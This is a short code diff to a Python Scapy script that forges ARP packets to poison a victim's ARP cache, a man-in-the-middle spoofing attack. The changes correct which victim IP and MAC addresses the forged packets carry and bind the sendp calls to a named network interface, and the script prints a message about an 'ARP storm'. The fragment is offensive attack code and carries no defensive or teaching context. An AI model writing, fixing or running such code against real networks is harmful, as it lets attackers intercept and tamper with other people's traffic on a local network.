@@ -51,9 +51,9 @@ def build_icmp_echo():
 def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
     arp = ARP()
     arp.hwsrc = attacker_mac
-    arp.psrc = victim_src_ip
-    arp.hwdst = victim_dst_mac
-    arp.pdst = victim_dst_ip
+    arp.psrc = victim_dst_ip
+    arp.hwdst = victim_src_mac
+    arp.pdst = victim_src_ip
     arp.op = mode # 1 for request, 2 for reply
     return arp
 
@@ -78,10 +78,10 @@ def arp_poison():
     sendp(icmp)
 
     arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
-    sendp(arp) # iface="enp0s3"
+    sendp(arp, iface="enp0s3")
 
     arp[ARP].op = 1
-    sendp(arp) # iface="enp0s3"
+    sendp(arp, iface="enp0s3") 
 
     print("[*] end of ARP storm...")
 
